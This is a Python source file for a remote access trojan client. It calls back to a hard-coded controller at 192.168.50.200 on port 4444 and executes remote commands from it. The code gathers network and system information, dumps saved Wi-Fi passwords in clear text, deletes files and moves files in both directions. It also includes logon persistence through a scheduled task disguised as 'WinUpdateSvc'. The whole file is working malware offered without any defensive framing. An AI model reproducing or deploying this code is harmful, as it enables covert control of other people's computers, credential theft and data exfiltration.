import os
import sys
import time
import socket
import ctypes
import subprocess
from cryptography.fernet import Fernet
import platform
import random



# ------------------ Encryption ------------------

key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt(data: bytes) -> bytes:
    return cipher.encrypt(data)

def decrypt(data: bytes) -> bytes:
    return cipher.decrypt(data)

def to_chunks(data: bytes, chunk_size: int = 1024):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

# ------------------ Smart sleep ------------------
def smart_sleep():
    delay = random.randint(20, 40)
    print(f"[*] Sleeping for {delay} seconds...")
    time.sleep(delay)

# ------------------ Registry Persistence ------------------

def create_persistent_task(task_name="WinUpdateSvc"):

    exe_path = sys.executable


    ps_command = f'''
    $Action = New-ScheduledTaskAction -Execute '{exe_path}'
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
    $Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger
    Register-ScheduledTask -TaskName "{task_name}" -InputObject $Task -Force
    '''

    try:

        result = subprocess.run(["powershell", "-Command", ps_command],
                                capture_output=True, text=True)
        if result.returncode == 0:
            print("✅ Task created successfully.")
        else:
            print("❌ Failed to create task:\n", result.stderr)
    except Exception as e:
        print(f"⚠️ Error running PowerShell: {e}")

def remove_task(task_name="WinUpdateSvc"):
    try:
        result = subprocess.run(
            f'schtasks /delete /tn "{task_name}" /f',
            shell=True, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"❌ Error removing task: {e}")
# ------------------ Wallpaper Control ------------------

def change_wallpaper(image_path: str) -> bytes:
    if not os.path.exists(image_path):
        return encrypt(b"Image not found")
    
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
    return encrypt(b"Wallpaper changed")

def predict_operating_system():
    os_name=platform.system()
    return os_name


# ------------------ Client Handler ------------------

class ClientHandler:
    def __init__(self, connection: socket.socket):
        self.connection = connection

    def send(self, data: bytes):
        self.connection.sendall(data)

    def recv(self, size: int = 1024) -> bytes:
        return self.connection.recv(size)
    
    def download(self,filename):
        with open(f'{filename}','wb') as file:
            chunk_number = 1
            while True:    
                data = self.connection.recv(1024)
                if (data==b"Done"):
                    break
                file.write(data)
                print(f"chunk {chunk_number} received.", end='\r',flush=True)
                chunk_number += 1
            file.close()
            print("\nFile received successfully.")
        
    def upload(self,filename):
        with open(filename, 'rb') as file:
            chunk_number = 1
            while True:
                data_chunk = file.read(1024)
                if not data_chunk:
                    self.send(b'Done')
                    break
                self.send(data_chunk)
                print(f"Chunk {chunk_number} sent.", end='\r',flush=True)
                chunk_number += 1
                time.sleep(0.5)
            file.close()
            print("\nFile sent successfully.")

    def authenticate(self, valid_user="test", valid_pass="test") -> bool:
        logged_in = False
        counter = 0
        while not logged_in:
            self.send(encrypt(b"Username: "))
            username = decrypt(self.recv()).decode().strip()
            self.send(encrypt(b"Password: "))
            password = decrypt(self.recv()).decode().strip()

            if username == valid_user and password == valid_pass:
                self.send(encrypt(b"Authentication successful"))
                logged_in = True
                return True
            elif counter <2:
                counter += 1
                self.send(encrypt(f"Wrong credentials ,you have {3-counter} more tries".encode()))
            else:
                self.send(encrypt(b"Authentication failed"))
                return False

    def send_data(self, data: bytes):
        encrypted = encrypt(data)
        chunks = to_chunks(encrypted)
        self.send(encrypt(str(len(chunks)).encode()))
        time.sleep(1)
        for chunk in chunks:
            self.send(chunk)
            time.sleep(0.02)


    def handle_commands(self,os_name):
        while True:
            try:
                cmd = decrypt(self.recv()).decode()
                print(f"[Received] {cmd}")
                if cmd == "close":
                    self.connection.close()
                    sys.exit()

                elif cmd == "dir":
                    if os_name=="Windows":
                        result = subprocess.run("dir", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("ls -ltrh", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd == "path":
                    if os_name=="Windows":
                        current = os.path.abspath(os.getcwd())
                        self.send_data(current.encode())
                    else:
                        result = subprocess.run("pwd", shell=True, capture_output=True, text=True).stdout
                        self.send_data(result.encode())

                elif cmd == "ipconfig":
                    if os_name=="Windows":
                        result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("ip a", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd == "arp -a":
                    result = subprocess.run("arp -a", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())
                
                elif cmd == "wifi-networks":
                    if os_name=="Windows":
                        result = subprocess.run("netsh wlan show profile", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = "Still unavailable on linux"
                    self.send_data(result.encode())
                
                elif cmd == "hostname":
                    if os_name=="Windows":
                        result = subprocess.run("systeminfo", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("hostnamectl", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())
                
                elif cmd.startswith("wifi-password "):
                    wifi_network = cmd.split(" ",1)[1]
                    command = f'netsh wlan show profile "{wifi_network}" key=clear'
                    if os_name=="Windows":
                        result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
                    else:
                        result = "Still unavailable on linux"
                    self.send_data(result.encode())                    

                elif cmd.startswith("del "):
                    filename = cmd.split(" ", 1)[1]
                    try:
                        os.remove(os.path.join(os.getcwd(), filename))
                        self.send(encrypt(b"File deleted"))
                    except:
                        self.send(encrypt(b"Deletion failed"))

                elif cmd.startswith("cd "):
                    directory = cmd.split(" ", 1)[1]
                    try:
                        os.chdir(directory)
                        current = os.path.abspath(os.getcwd())
                        self.send(encrypt(b"1"))
                        time.sleep(0.5)
                        self.send(encrypt(f"Changed to {current}".encode()))
                    except:
                        self.send(encrypt(b"Directory change failed"))

                elif cmd.startswith("download "):
                    file_name = decrypt(self.recv()).decode()
                    self.upload(file_name)


                elif cmd.startswith("upload "):
                    file_name = decrypt(self.recv()).decode()
                    self.download(file_name)

                elif cmd.startswith("wall "):
                    if os_name=="Windows":
                        filename = cmd.split(" ", 1)[1]
                        result = change_wallpaper(os.path.join(os.getcwd(), filename))
                        self.send(encrypt(b"1"))
                        self.send(result)
                    else:
                        self.send(encrypt(b'1'))
                        self.send(b'This operation is not supported on this OS.')

                else:
                    self.send(encrypt(b"Unknown command"))

            except Exception as e:
                print(f"[Error] {e}")
                break

# ------------------ Main Server ------------------

def Connect_to_server():
    operating_system = predict_operating_system()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        while 1:
            try:
                sock.connect(("192.168.50.200",4444))
                print("[*] Connected to server ...    ")
                time.sleep(1)
                sock.sendall(key)
                time.sleep(1)
                sock.sendall(operating_system.encode())
                client = ClientHandler(sock)
                if client.authenticate():
                    client.handle_commands(operating_system)
                else:
                    print("Authentication Error")
                client.connection.close()
                return
            except Exception:
                timer = 20
                print("Server is not up yet. Trying again in")
                for i in range(timer,0,-1):
                    print(f"{i} seconds ", end="\r",flush=True)
                    time.sleep(1)

if __name__ == "__main__":
    #create_persistent_task()
    #remove_task()
    Connect_to_server()